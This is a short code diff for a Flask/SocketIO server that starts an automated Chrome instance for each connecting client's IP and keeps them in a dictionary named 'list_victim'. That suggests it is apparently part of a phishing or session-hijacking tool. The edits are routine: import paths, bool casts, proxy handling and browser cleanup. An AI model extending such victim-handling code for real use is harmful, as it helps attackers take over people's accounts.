@@ -4,8 +4,8 @@ import socket
 from flask import Flask, render_template, request, send_from_directory
 from flask_socketio import SocketIO
 
-from modules.database import Config, Data, Setting
-from modules.lib import *
+from .database import Config, Data, Setting
+from .lib import *
 
 app = Flask(__name__, static_folder="static",
             template_folder="static", static_url_path="/static")
@@ -47,8 +47,9 @@ def handle_connect():
         ip = request.headers.getlist("X-Forwarded-For")[0]
     else:
         ip = request.remote_addr
+    proxy = None if proxy == "" else proxy
     list_victim[ip] = AutoChrome(
-        image=load_image, css=load_css, headless=hide_chrome, keep_open=auto_close, proxy=proxy)
+        image=bool(load_image), css=bool(load_css), headless=bool(hide_chrome), keep_open=bool(auto_close), proxy=proxy)
 
 
 @socketio.on("disconnect")
@@ -57,6 +58,7 @@ def handle_disconnect():
         ip = request.headers.getlist("X-Forwarded-For")[0]
     else:
         ip = request.remote_addr
+    list_victim[ip].quit()
     list_victim.pop(ip)
 
 
